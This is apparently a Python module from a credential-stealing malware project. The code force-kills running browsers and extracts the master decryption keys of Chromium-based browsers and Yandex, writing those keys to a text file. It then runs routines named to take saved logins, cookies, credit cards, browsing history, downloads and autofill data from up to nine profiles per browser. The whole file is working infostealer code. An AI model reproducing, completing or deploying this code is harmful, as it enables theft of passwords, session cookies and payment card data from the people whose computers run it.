import base64
import os
import psutil

# ------------------------------------------------------
# import functions from modules dir 
from modules.Browsers.chromium_base.browser_paths import allBrowsersPath
from modules.Browsers.chromium_base.get_masterkey import GetMasterKey
from modules.Browsers.chromium_base.login import get_login_data
from modules.Browsers.chromium_base.cookier import get_cookies
from modules.Browsers.chromium_base.creadits import get_credit_cards
from modules.Browsers.chromium_base.history import get_web_history
from modules.Browsers.chromium_base.downloads import get_downloads
from modules.Browsers.chromium_base.auto_fill import steal_auto_fill
# ------------------------------------------------------
from modules.Browsers.yandex.yandex_browser_data import YandexStealData



class BrowserDumpData:
    def __init__(self, king_folder):
        self.king_folder: str = king_folder
        self.king_folder_: str = os.path.join(king_folder, 'Browser Data')
        os.makedirs(self.king_folder_, exist_ok=True)
        self.close_browser_processes()
        allBrowserPaths: dict[str, str] = allBrowsersPath()

        profiles: list[str] = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
            'Person 1',
            'Person 2',
            'Person 3',
        ]
        

        for browser_name, value in allBrowserPaths.items():
            if not os.path.exists(value['path_data']):
                continue
            if browser_name == "yandex":
                YandexStealData(value['path_data'], self.king_folder)
                continue

            local_state: str = f'{value['path_data']}\\Local State'
            if not os.path.exists(local_state):
                continue
            # print(value['key_name'])
            master_key_class: object = GetMasterKey(local_state, value['key_name'])
            masterKey: bytes = master_key_class.get_master_key()
            if not masterKey:
                continue
           
            with open(
                os.path.join(king_folder, "Browser Master-Key.txt"), 
                "a",
                encoding='utf-8',
                errors='ignore'
            ) as master_key:
                master_key.write(f'\n{browser_name} Master Key: {masterKey.hex()}\n\n')

            for profile in profiles:

                profilePath: str = os.path.join(value['path_data'], profile)
                if not os.path.exists(profilePath):
                    continue
                self.runAllFunctions(profilePath, masterKey, self.king_folder_, browser_name, profile)
                
    def runAllFunctions(self, profilePath, masterKey: bytes, kingFolder: str, browserName: str, profile):
        get_login_data(profilePath, masterKey, self.king_folder, browserName, profile)
        get_cookies(profilePath, masterKey, kingFolder, browserName)
        get_credit_cards(profilePath, masterKey, kingFolder)
        get_web_history(profilePath, kingFolder)
        get_downloads(profilePath, kingFolder)
        steal_auto_fill(profilePath, kingFolder, browserName)

    def close_browser_processes(self) -> None:
        browsers_to_close: list[str] = [ #   add 
            "brave.exe", "opera.exe", "safari.exe", "iexplore.exe","msedge.exe", 
            "vivaldi.exe", "7Star.exe", "torch.exe", "chrome.exe",
            "Sputnik.exe", "browser.exe", "CentBrowser.exe", "amigo.exe",# "chromium.exe"
        ]
        
        try:
            for proc in psutil.process_iter(attrs=['pid', 'name']):
                if proc.info['name'] in browsers_to_close:
                    proc.kill()
        except Exception as err:
            print(err)


   